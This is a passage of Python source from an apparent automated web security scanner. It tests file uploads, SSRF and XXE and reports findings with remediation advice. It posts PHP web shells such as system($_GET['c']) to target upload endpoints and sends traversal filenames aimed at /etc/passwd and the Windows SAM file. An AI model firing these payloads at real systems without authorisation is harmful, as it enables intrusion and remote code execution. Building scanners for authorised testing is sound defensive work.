                    matches = re.findall(pattern, content)
                    
                    if matches:
                        # Mask the key for reporting
                        masked = [m[:8] + "..." + m[-4:] if len(m) > 12 else "***" for m in matches[:3]]
                        
                        findings.append(Finding(
                            vuln_type=VulnType.INFO_DISCLOSURE,
                            name=f"Exposed {key_type}",
                            severity=Severity.HIGH,
                            description=f"{key_type} found exposed in page source. "
                                       f"This could allow unauthorized API access.",
                            host=base_url,
                            endpoint=base_url,
                            evidence=[f"Keys found (masked): {masked}"],
                            cvss_score=7.5,
                            cwe_id="CWE-312",
                            remediation="Remove API keys from client-side code. "
                                       "Use environment variables and server-side proxies. "
                                       "Rotate exposed keys immediately.",
                            confidence_score=90,
                        ).to_dict())
                        
        except Exception as e:
            logger.debug(f"API key check failed: {e}")
        
        # Check JavaScript files
        js_files = asset_data.get("js_files", [])
        
        for js_url in js_files[:10]:
            await rate_limiter.acquire()
            
            try:
                async with get_scan_client(timeout=self.timeout, verify_ssl=False, http2=True) as client:
                    response = await client.get(js_url, timeout=10.0)
                    content = response.text
                    
                    for pattern, key_type in api_key_patterns:
                        if re.search(pattern, content):
                            findings.append(Finding(
                                vuln_type=VulnType.INFO_DISCLOSURE,
                                name=f"Exposed {key_type} in JavaScript",
                                severity=Severity.HIGH,
                                description=f"{key_type} found in JavaScript file.",
                                host=base_url,
                                endpoint=js_url,
                                evidence=[f"Found in: {js_url}"],
                                cvss_score=7.5,
                                cwe_id="CWE-312",
                                remediation="Remove API keys from JavaScript files.",
                                confidence_score=90,
                            ).to_dict())
                            break
                            
            except Exception as e:
                logger.debug(f"JS API key check failed: {e}")
        
        return findings

    # ========================================================================
    # ENTERPRISE METHODS - File Upload Security
    # ========================================================================
    
    async def _check_file_upload_security(
        self,
        base_url: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Enterprise: Comprehensive file upload security testing.
        
        Tests:
        - Extension bypass (double extension, null byte, case manipulation)
        - Content-Type bypass
        - Magic bytes bypass
        - Polyglot files (valid image + malicious code)
        - SVG XSS
        - Path traversal in filename
        """
        findings = []
        
        # Discover upload endpoints
        upload_endpoints = await self._discover_upload_endpoints(base_url, rate_limiter)
        
        if not upload_endpoints:
            # Also check from asset_data
            forms = asset_data.get("forms", [])
            for form in forms:
                if form.get("enctype") == "multipart/form-data":
                    action = form.get("action", "")
                    if action:
                        upload_endpoints.append(urljoin(base_url, action))
        
        self.discovered_uploads = upload_endpoints
        
        for endpoint in upload_endpoints[:5]:  # Limit to 5 endpoints
            # Test extension bypass
            ext_findings = await self._test_extension_bypass(endpoint, rate_limiter)
            findings.extend(ext_findings)
            
            # Test Content-Type bypass
            ct_findings = await self._test_content_type_bypass(endpoint, rate_limiter)
            findings.extend(ct_findings)
            
            # Test magic bytes bypass
            magic_findings = await self._test_magic_bytes_bypass(endpoint, rate_limiter)
            findings.extend(magic_findings)
            
            # Test polyglot files
            poly_findings = await self._test_polyglot_upload(endpoint, rate_limiter)
            findings.extend(poly_findings)
            
            # Test SVG XSS
            svg_findings = await self._test_svg_xss(endpoint, rate_limiter)
            findings.extend(svg_findings)
            
            # Test path traversal
            traversal_findings = await self._test_upload_path_traversal(endpoint, rate_limiter)
            findings.extend(traversal_findings)
        
        return findings
    
    async def _discover_upload_endpoints(
        self,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[str]:
        """Discover file upload endpoints using EndpointMap + fallback."""
        endpoints = []

        # PRIORITY 1: Get FILE_UPLOAD endpoints from EndpointMap
        endpoint_map = EndpointMap.get_instance()
        upload_endpoints = endpoint_map.get_by_category(EndpointCategory.FILE_UPLOAD)

        if upload_endpoints:
            for ep in upload_endpoints:
                if ep.verified or ep.confidence >= 0.7:
                    url = urljoin(base_url, ep.path)
                    endpoints.append(url)
            logger.info(f"[Upload] Using {len(endpoints)} endpoints from EndpointMap")
            return list(set(endpoints))

        # FALLBACK: Hardcoded paths (only if EndpointMap has none)
        logger.info("[Upload] EndpointMap has no upload endpoints, using hardcoded paths")
        async with get_scan_client(timeout=self.timeout, verify_ssl=False, http2=True) as client:
            for path in self.UPLOAD_PATHS:
                await rate_limiter.acquire()

                url = urljoin(base_url, path)
                try:
                    # Try GET to see if endpoint exists
                    response = await client.get(url, timeout=10.0)
                    if response.status_code in [200, 401, 403, 405]:
                        endpoints.append(url)

                    # Try OPTIONS to check allowed methods
                    options_resp = await client.options(url)
                    allow = options_resp.headers.get("Allow", "")
                    if "POST" in allow or "PUT" in allow:
                        endpoints.append(url)

                except Exception as e:
                    logger.debug(f"[API] Upload endpoint discovery error for {url}: {e}")
                    continue

        return list(set(endpoints))
    
    async def _test_extension_bypass(
        self,
        upload_url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """Test for extension bypass vulnerabilities."""
        findings = []
        
        # PHP shell content
        shell_content = b"<?php echo 'VULN_TEST_' . phpinfo(); ?>"
        
        async with get_scan_client(timeout=self.timeout, verify_ssl=False, http2=True) as client:
            for payload_template in EXTENSION_BYPASS_PAYLOADS[:10]:
                await rate_limiter.acquire()
                
                filename = payload_template.format(name="test")
                
                # Clean null bytes for display
                display_name = filename.replace("\x00", "%00")
                
                try:
                    files = {
                        "file": (filename, shell_content, "image/jpeg"),
                    }
                    
                    response = await client.post(upload_url, files=files, timeout=15.0)
                    
                    if response.status_code in [200, 201]:
                        # Check if file was uploaded
                        response_text = response.text.lower()
                        
                        # Look for upload success indicators
                        success_indicators = ["success", "uploaded", "url", "path", "file"]
                        if any(ind in response_text for ind in success_indicators):
                            findings.append(Finding(
                                vuln_type=VulnType.FILE_UPLOAD,
                                name="Extension Bypass Vulnerability",
                                severity=Severity.CRITICAL,
                                description=f"File upload accepts dangerous extension bypass: {display_name}. "
                                           f"This may allow execution of malicious code.",
                                host=urlparse(upload_url).netloc,
                                endpoint=upload_url,
                                evidence=[
                                    f"Filename: {display_name}",
                                    f"Response: {response.status_code}",
                                    f"Content: {response_text[:200]}",
                                ],
                                cvss_score=9.8,
                                cwe_id="CWE-434",
                                remediation="Use allowlist of safe extensions. "
                                           "Strip/sanitize filenames. "
                                           "Store files outside web root. "
                                           "Use random filenames.",
                                confidence_score=95,
                            ).to_dict())
                            break  # Found vulnerability, stop testing
                            
                except Exception as e:
                    logger.debug(f"Extension bypass test failed: {e}")
        
        return findings
    
    async def _test_content_type_bypass(
        self,
        upload_url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """Test for Content-Type bypass vulnerabilities."""
        findings = []
        
        shell_content = b"<?php system($_GET['c']); ?>"
        
        async with get_scan_client(timeout=self.timeout, verify_ssl=False, http2=True) as client:
            for content_type, filename in CONTENT_TYPE_BYPASS[:5]:
                await rate_limiter.acquire()
                
                try:
                    files = {
                        "file": (filename, shell_content, content_type),
                    }
                    
                    response = await client.post(upload_url, files=files, timeout=15.0)
                    
                    if response.status_code in [200, 201]:
                        response_text = response.text.lower()
                        
                        if "error" not in response_text and "invalid" not in response_text:
                            findings.append(Finding(
                                vuln_type=VulnType.FILE_UPLOAD,
                                name="Content-Type Bypass",
                                severity=Severity.HIGH,
                                description=f"File upload accepts mismatched Content-Type. "
                                           f"Uploaded {filename} with Content-Type: {content_type or 'empty'}",
                                host=urlparse(upload_url).netloc,
                                endpoint=upload_url,
                                evidence=[
                                    f"Filename: {filename}",
                                    f"Content-Type: {content_type}",
                                    f"Response: {response.status_code}",
                                ],
                                cvss_score=8.1,
                                cwe_id="CWE-436",
                                remediation="Validate Content-Type server-side. "
                                           "Check file magic bytes. "
                                           "Don't trust client headers.",
                                confidence_score=90,
                            ).to_dict())
                            break
                            
                except Exception as e:
                    logger.debug(f"Content-Type bypass test failed: {e}")
        
        return findings
    
    async def _test_magic_bytes_bypass(
        self,
        upload_url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """Test magic bytes validation bypass."""
        findings = []
        
        async with get_scan_client(timeout=self.timeout, verify_ssl=False, http2=True) as client:
            for sig_name, sig in FILE_SIGNATURES.items():
                await rate_limiter.acquire()
                
                # Create file with valid magic bytes but PHP content
                malicious_content = sig.magic_bytes + b"\n<?php system($_GET['c']); ?>"
                filename = f"test.{sig.extension}.php"
                
                try:
                    files = {
                        "file": (filename, malicious_content, sig.mime_type),
                    }
                    
                    response = await client.post(upload_url, files=files, timeout=15.0)
                    
                    if response.status_code in [200, 201]:
                        response_text = response.text.lower()
                        
                        if "error" not in response_text:
                            findings.append(Finding(
                                vuln_type=VulnType.FILE_UPLOAD,
                                name="Magic Bytes Bypass",
                                severity=Severity.HIGH,
                                description=f"File upload validates magic bytes but not extension. "
                                           f"File with {sig.description} header but .php extension accepted.",
                                host=urlparse(upload_url).netloc,
                                endpoint=upload_url,
                                evidence=[
                                    f"Filename: {filename}",
                                    f"Magic bytes: {sig_name}",
                                    f"Response: {response.status_code}",
                                ],
                                cvss_score=8.1,
                                cwe_id="CWE-434",
                                remediation="Validate both magic bytes AND extension. "
                                           "Use file type libraries for proper detection.",
                                confidence_score=90,
                            ).to_dict())
                            break
                            
                except Exception as e:
                    logger.debug(f"Magic bytes test failed: {e}")
        
        return findings
    
    async def _test_polyglot_upload(
        self,
        upload_url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """Test polyglot file upload (valid image + code)."""
        findings = []
        
        async with get_scan_client(timeout=self.timeout, verify_ssl=False, http2=True) as client:
            for poly_name, poly_content in POLYGLOT_TEMPLATES.items():
                await rate_limiter.acquire()
                
                ext = poly_name.split("_")[0]
                filename = f"polyglot.{ext}"
                
                try:
                    files = {
                        "file": (filename, poly_content, f"image/{ext}"),
                    }
                    
                    response = await client.post(upload_url, files=files, timeout=15.0)
                    
                    if response.status_code in [200, 201]:
                        # Try to extract uploaded URL
                        try:
                            data = response.json()
                            uploaded_url = data.get("url", data.get("path", ""))
                        except Exception:
                            uploaded_url = ""
                        
                        findings.append(Finding(
                            vuln_type=VulnType.FILE_UPLOAD,
                            name="Polyglot File Accepted",
                            severity=Severity.HIGH,
                            description=f"Server accepts polyglot file that is valid image AND contains code. "
                                       f"If server executes this, it leads to RCE.",
                            host=urlparse(upload_url).netloc,
                            endpoint=upload_url,
                            evidence=[
                                f"Polyglot type: {poly_name}",
                                f"Filename: {filename}",
                                f"Uploaded to: {uploaded_url}" if uploaded_url else "URL not exposed",
                            ],
                            cvss_score=7.5,
                            cwe_id="CWE-434",
                            remediation="Re-encode uploaded images. "
                                       "Strip metadata and comments. "
                                       "Use image libraries to validate and rewrite files.",
                            confidence_score=90,
                        ).to_dict())
                        break
                        
                except Exception as e:
                    logger.debug(f"Polyglot test failed: {e}")
        
        return findings
    
    async def _test_svg_xss(
        self,
        upload_url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """Test SVG file XSS vulnerabilities."""
        findings = []
        
        async with get_scan_client(timeout=self.timeout, verify_ssl=False, http2=True) as client:
            for svg_payload in SVG_XSS_PAYLOADS[:2]:
                await rate_limiter.acquire()
                
                try:
                    files = {
                        "file": ("test.svg", svg_payload.encode(), "image/svg+xml"),
                    }
                    
                    response = await client.post(upload_url, files=files, timeout=15.0)
                    
                    if response.status_code in [200, 201]:
                        findings.append(Finding(
                            vuln_type=VulnType.FILE_UPLOAD,
                            name="SVG XSS Upload",
                            severity=Severity.MEDIUM,
                            description="Server accepts SVG files with JavaScript. "
                                       "If served to users, this enables stored XSS attacks.",
                            host=urlparse(upload_url).netloc,
                            endpoint=upload_url,
                            evidence=[
                                "SVG with <script> or event handlers accepted",
                                f"Response: {response.status_code}",
                            ],
                            cvss_score=6.1,
                            cwe_id="CWE-79",
                            remediation="Sanitize SVG files to remove script tags and event handlers. "
                                       "Serve SVG with Content-Type: image/svg+xml and CSP headers. "
                                       "Consider converting SVG to raster images.",
                            confidence_score=85,
                        ).to_dict())
                        break
                        
                except Exception as e:
                    logger.debug(f"SVG XSS test failed: {e}")
        
        return findings
    
    async def _test_upload_path_traversal(
        self,
        upload_url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """Test path traversal in uploaded filename."""
        findings = []
        
        traversal_names = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        ]
        
        async with get_scan_client(timeout=self.timeout, verify_ssl=False, http2=True) as client:
            for traversal_name in traversal_names[:3]:
                await rate_limiter.acquire()
                
                try:
                    files = {
                        "file": (traversal_name, b"test content", "text/plain"),
                    }
                    
                    response = await client.post(upload_url, files=files, timeout=15.0)
                    
                    if response.status_code in [200, 201]:
                        response_text = response.text.lower()
                        
                        # Check for success without sanitization error
                        if "invalid" not in response_text and "error" not in response_text:
                            findings.append(Finding(
                                vuln_type=VulnType.FILE_UPLOAD,
                                name="Path Traversal in Upload",
                                severity=Severity.CRITICAL,
                                description="File upload may allow path traversal via filename. "
                                           "Could allow writing files outside upload directory.",
                                host=urlparse(upload_url).netloc,
                                endpoint=upload_url,
                                evidence=[
                                    f"Filename: {traversal_name}",
                                    f"Response: {response.status_code}",
                                ],
                                cvss_score=9.8,
                                cwe_id="CWE-22",
                                remediation="Sanitize filenames - remove path separators. "
                                           "Use basename only. "
                                           "Generate random filenames server-side.",
                                confidence_score=95,
                            ).to_dict())
                            break
                            
                except Exception as e:
                    logger.debug(f"Path traversal test failed: {e}")
        
        return findings
    
    # ========================================================================
    # ENTERPRISE METHODS - SSRF Testing
    # ========================================================================
    
    async def _check_ssrf_vulnerabilities(
        self,
        base_url: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Enterprise: Test for Server-Side Request Forgery vulnerabilities.
        """
        findings = []
        
        # Find parameters that might accept URLs
        endpoints = asset_data.get("endpoints", [])
        url_params = ["url", "uri", "path", "dest", "redirect", "site", "html",
                      "img", "image", "load", "fetch", "proxy", "link", "src"]
        
        async with get_scan_client(timeout=self.timeout, verify_ssl=False, http2=True) as client:
            for endpoint in endpoints[:self.max_endpoints_per_test]:
                parsed = urlparse(endpoint)
                params = parse_qs(parsed.query)
                
                for i_param_name, param_name in enumerate(params):
                    if any(up in param_name.lower() for up in url_params):
                        # Found URL-like parameter, test SSRF
                        for ssrf_payload in SSRF_PAYLOADS[:5]:
                            await rate_limiter.acquire()
                            
                            # Build test URL
                            new_params = dict(params)
                            new_params[i_param_name] = [ssrf_payload]
                            
                            test_query = "&".join(f"{k}={v[0]}" for k, v in new_params.items())
                            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                            
                            try:
                                response = await client.get(test_url, timeout=5.0)
                                
                                # Check for SSRF indicators
                                ssrf_indicators = [
                                    "root:", "bin/bash",  # /etc/passwd
                                    "ami-id", "instance-id",  # AWS metadata
                                    "computeMetadata",  # GCP metadata
                                    "redis_version", "+OK",  # Redis
                                ]
                                
                                for indicator in ssrf_indicators:
                                    if indicator in response.text:
                                        findings.append(Finding(
                                            vuln_type=VulnType.SSRF,
                                            name="Server-Side Request Forgery",
                                            severity=Severity.CRITICAL,
                                            description=f"SSRF vulnerability in parameter '{param_name}'. "
                                                       f"Server made request to internal resource.",
                                            host=urlparse(base_url).netloc,
                                            endpoint=endpoint,
                                            evidence=[
                                                f"Parameter: {param_name}",
                                                f"Payload: {ssrf_payload}",
                                                f"Indicator: {indicator}",
                                            ],
                                            cvss_score=9.1,
                                            cwe_id="CWE-918",
                                            remediation="Whitelist allowed URLs/domains. "
                                                       "Block internal IP ranges. "
                                                       "Use URL parsers to validate.",
                                            confidence_score=95,
                                        ).to_dict())
                                        return findings  # Critical found
                                        
                            except Exception:
                                continue
        
        return findings
    
    # ========================================================================
    # ENTERPRISE METHODS - XXE Testing
    # ========================================================================
    
    async def _check_xxe_vulnerabilities(
        self,
        base_url: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Enterprise: Test for XML External Entity vulnerabilities.
        """
        findings = []
        
        # Find XML-accepting endpoints
        xml_endpoints = []
        
        # Check discovered endpoints
        endpoints = asset_data.get("endpoints", [])
        for ep in endpoints:
            if "xml" in ep.lower():
                xml_endpoints.append(ep)
        
        # Also check common XML paths
        xml_paths = ["/api/xml", "/xml", "/import/xml", "/upload/xml", "/soap", "/wsdl"]
        for path in xml_paths:
            xml_endpoints.append(urljoin(base_url, path))
        
        async with get_scan_client(timeout=self.timeout, verify_ssl=False, http2=True) as client:
            for endpoint in xml_endpoints[:5]:
                for xxe_payload in XXE_PAYLOADS[:2]:
                    await rate_limiter.acquire()
                    
                    try:
                        response = await client.post(
                            endpoint,
                            content=xxe_payload.encode(),
                            headers={"Content-Type": "application/xml"},
                            timeout=10.0,
                        )
                        
                        # Check for XXE indicators
                        xxe_indicators = [
                            "root:", "bin/bash", "/bin/sh",  # /etc/passwd content
                            "<!ENTITY", "SYSTEM",  # XXE error messages
                        ]
                        
                        for indicator in xxe_indicators:
                            if indicator in response.text:
                                findings.append(Finding(
                                    vuln_type=VulnType.XXE,
                                    name="XML External Entity (XXE)",
                                    severity=Severity.CRITICAL,
                                    description="XXE vulnerability detected. "
                                               "Server processes external entities in XML.",
                                    host=urlparse(base_url).netloc,
                                    endpoint=endpoint,
                                    evidence=[
                                        f"Endpoint: {endpoint}",
                                        f"Indicator: {indicator}",
                                        f"Response snippet: {response.text[:200]}",
                                    ],
                                    cvss_score=9.1,
                                    cwe_id="CWE-611",
                                    remediation="Disable external entity processing. "
                                               "Use safe XML parsers. "
                                               "Validate and sanitize XML input.",
                                    confidence_score=95,
                                ).to_dict())
                                return findings  # Critical found
                                
                    except Exception:
                        continue
        
        return findings